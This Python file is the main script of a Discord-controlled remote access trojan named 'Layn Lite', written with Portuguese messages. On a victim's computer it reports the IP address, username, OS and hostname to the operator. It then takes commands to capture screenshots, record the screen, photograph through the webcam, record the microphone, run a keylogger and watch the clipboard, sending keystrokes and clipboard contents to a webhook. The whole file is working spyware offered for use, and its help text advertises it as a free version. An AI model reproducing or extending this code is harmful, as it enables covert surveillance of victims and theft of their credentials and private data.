import discord
from discord.ext import commands
from discord import app_commands
import os
import cv2
import pyautogui
import sounddevice as sd
import scipy.io.wavfile as wav
import numpy as np
import tempfile
import time
from datetime import datetime
import threading
from libraries import layn
from libraries.clippb0004rf import ClipboardMonitor
from libraries.k333yl000g import Keylogger
from libraries import utils  

from config import BOT_TOKEN, GUILD_ID, CHANNEL_ID, WEBHOOK_URL


intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
GUILD = discord.Object(id=GUILD_ID)


keyboard_logger = None
clipboard_monitor = None
current_id = None

@bot.event
async def on_ready():
    await bot.wait_until_ready()
    
   
    bot.channel = bot.get_channel(CHANNEL_ID)
    
   
    system_info = utils.get_system_info()
    
   
    embed = discord.Embed(
        title="🟢 Layn Lite Conectado",
        description=f"**Horário: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}**",
        color=0x00FF00
    )
    
    embed.add_field(name="IP", value=system_info['ip'], inline=True)
    embed.add_field(name="Usuário", value=system_info['username'], inline=True)
    embed.add_field(name="Sistema", value=system_info['os'], inline=True)
    embed.add_field(name="Hostname", value=system_info['hostname'], inline=True)
    
    await bot.channel.send(embed=embed)
    print(f'Bot conectado como {bot.user}')


@bot.command()
@commands.is_owner()
async def sync(ctx):
    """Sincroniza os comandos com o Discord"""
    try:
        await bot.tree.sync(guild=GUILD)
        await ctx.send("Comandos sincronizados!")
    except Exception as e:
        await ctx.send(f"Erro: {e}")


@bot.hybrid_command(name="screenshot", description="Captura a tela do sistema alvo")
@app_commands.guilds(GUILD)
async def screenshot(ctx):
    """Captura a tela do sistema alvo"""
    try:
        
        screenshot_path = layn.take_screenshot()
        
        
        await ctx.send("Captura de tela:", file=discord.File(screenshot_path))
        
        
        os.remove(screenshot_path)
    except Exception as e:
        embed = discord.Embed(title="❌ Erro", description=f"Erro ao capturar tela: {str(e)}", color=0xFF0000)
        await ctx.send(embed=embed)


@bot.hybrid_command(name="screenrec", description="Grava a tela do sistema alvo")
@app_commands.guilds(GUILD)
async def screen_record(ctx, seconds: int = 10):
    """Grava a tela do sistema alvo por um período específico"""
    if seconds > 30:
        await ctx.send("⚠️ Tempo máximo de gravação: 30 segundos")
        seconds = 30
        
    try:
       
        await ctx.send("🎥 Gravando tela... Por favor, aguarde.")
        
       
        video_path = layn.record_screen(duration=seconds)
        
       
        await ctx.send("🎬 Gravação concluída:", file=discord.File(video_path))
        
       
        os.remove(video_path)
    except Exception as e:
        embed = discord.Embed(title="❌ Erro", description=f"Erro ao gravar tela: {str(e)}", color=0xFF0000)
        await ctx.send(embed=embed)


@bot.hybrid_command(name="webcam", description="Captura uma imagem da webcam")
@app_commands.guilds(GUILD)
async def webcam(ctx):
    """Captura uma imagem da webcam"""
    try:
        
        webcam_path = layn.capture_webcam()
        
        
        if isinstance(webcam_path, dict) and 'error' in webcam_path:
            raise Exception(webcam_path['error'])
        
        
        await ctx.send("📷 Imagem da webcam:", file=discord.File(webcam_path))
        
        
        os.remove(webcam_path)
    except Exception as e:
        embed = discord.Embed(title="❌ Erro", description=f"Erro ao acessar webcam: {str(e)}", color=0xFF0000)
        await ctx.send(embed=embed)


@bot.hybrid_command(name="recordmic", description="Grava áudio do microfone")
@app_commands.guilds(GUILD)
async def record_mic(ctx, seconds: int = 10):
    """Grava áudio do microfone por um período específico"""
    if seconds > 30:
        await ctx.send("⚠️ Tempo máximo de gravação: 30 segundos")
        seconds = 30
        
    try:
        
        await ctx.send(f"🎤 Gravando áudio por {seconds} segundos...")
        
        
        audio_path = layn.record_audio(seconds=seconds)
        
       
        if isinstance(audio_path, dict) and 'error' in audio_path:
            raise Exception(audio_path['error'])
        
        
        await ctx.send("🔊 Gravação concluída:", file=discord.File(audio_path))
        
        
        os.remove(audio_path)
    except Exception as e:
        embed = discord.Embed(title="❌ Erro", description=f"Erro ao gravar áudio: {str(e)}", color=0xFF0000)
        await ctx.send(embed=embed)


@bot.hybrid_command(name="keylog", description="Inicia ou para o keylogger")
@app_commands.guilds(GUILD)
async def keylog(ctx, mode: str, interval: int = 60):
    """Inicia ou para o keylogger"""
    global keyboard_logger
    
    if mode.lower() not in ['start', 'stop']:
        await ctx.send("❌ Modo inválido. Use 'start' ou 'stop'.")
        return
    
    try:
        if mode.lower() == 'start':
            if keyboard_logger and keyboard_logger.is_running():
                await ctx.send("⚠️ Keylogger já está em execução.")
                return
                
           
            keyboard_logger = Keylogger(interval=interval, webhook=WEBHOOK_URL)
            keyboard_logger.start()
            
            embed = discord.Embed(
                title="✅ Keylogger Iniciado",
                description=f"Intervalo de relatório: {interval} segundos",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
        else: 
            if not keyboard_logger or not keyboard_logger.is_running():
                await ctx.send("⚠️ Keylogger não está em execução.")
                return
                
            
            keyboard_logger.stop()
            
            embed = discord.Embed(
                title="🛑 Keylogger Parado",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="❌ Erro", description=f"Erro ao manipular keylogger: {str(e)}", color=0xFF0000)
        await ctx.send(embed=embed)


@bot.hybrid_command(name="clip", description="Ativa ou desativa o monitoramento da área de transferência")
@app_commands.guilds(GUILD)
async def clip(ctx, mode: str):
    """Ativa ou desativa o monitoramento da área de transferência"""
    global clipboard_monitor
    
    if mode.lower() not in ['on', 'off']:
        await ctx.send("❌ Modo inválido. Use 'on' ou 'off'.")
        return
    
    try:
        if mode.lower() == 'on':
            if clipboard_monitor and clipboard_monitor.is_running():
                await ctx.send("⚠️ Monitoramento de clipboard já está ativo.")
                return
                
            
            clipboard_monitor = ClipboardMonitor(interval=10, webhook=WEBHOOK_URL)
            clipboard_monitor.start()
            
            embed = discord.Embed(
                title="✅ Monitoramento de Clipboard Ativado",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
        else:  
            if not clipboard_monitor or not clipboard_monitor.is_running():
                await ctx.send("⚠️ Monitoramento de clipboard não está ativo.")
                return
                
           
            clipboard_monitor.stop()
            
            embed = discord.Embed(
                title="🛑 Monitoramento de Clipboard Parado",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(title="❌ Erro", description=f"Erro ao manipular monitor de clipboard: {str(e)}", color=0xFF0000)
        await ctx.send(embed=embed)


@bot.hybrid_command(name="help", description="Mostra os comandos disponíveis")
@app_commands.guilds(GUILD)
async def help_command(ctx):
    """Mostra os comandos disponíveis"""
    embed = discord.Embed(
        title="📚 Comandos do Layn Lite",
        description="Lista de comandos disponíveis nesta versão:",
        color=0x3498db
    )
    
    embed.add_field(name="/screenshot", value="Captura a tela do sistema alvo", inline=False)
    embed.add_field(name="/screenrec [segundos]", value="Grava a tela por um período específico (máx. 30s)", inline=False)
    embed.add_field(name="/webcam", value="Captura uma imagem da webcam", inline=False)
    embed.add_field(name="/recordmic [segundos]", value="Grava áudio do microfone (máx. 30s)", inline=False)
    embed.add_field(name="/keylog <start/stop> [intervalo]", value="Inicia ou para o keylogger", inline=False)
    embed.add_field(name="/clip <on/off>", value="Ativa ou desativa o monitoramento do clipboard", inline=False)
    
    embed.set_footer(text="Layn Lite v1.0.0 | Versão gratuita com recursos limitados")
    
    await ctx.send(embed=embed)


if __name__ == "__main__":
    bot.run(BOT_TOKEN)